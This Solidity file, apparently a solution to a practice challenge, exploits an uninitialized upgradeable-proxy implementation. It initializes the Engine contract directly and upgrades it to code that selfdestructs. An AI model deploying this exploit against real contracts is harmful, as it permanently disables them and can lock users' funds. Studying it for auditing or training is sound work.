// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

interface IMotorbike {
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
}

contract EngineDestroyer {
    event EngineAddress(address);
    event AttackComplete();
    
    function attack() external {
        // Calculate Engine address - it's deployed by factory at nonce 1
        address engine = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xd6), 
            bytes1(0x94), 
            address(0x5FbDB2315678afecb367f032d93F642f64180aa3),
            bytes1(0x01)
        )))));
        
        emit EngineAddress(engine);
        
        // Initialize the Engine directly (not through proxy)
        IEngine(engine).initialize();
        
        // Now upgrade to malicious implementation
        IEngine(engine).upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destroy()")
        );
        
        emit AttackComplete();
    }
    
    function destroy() external {
        selfdestruct(address(0));
    }
}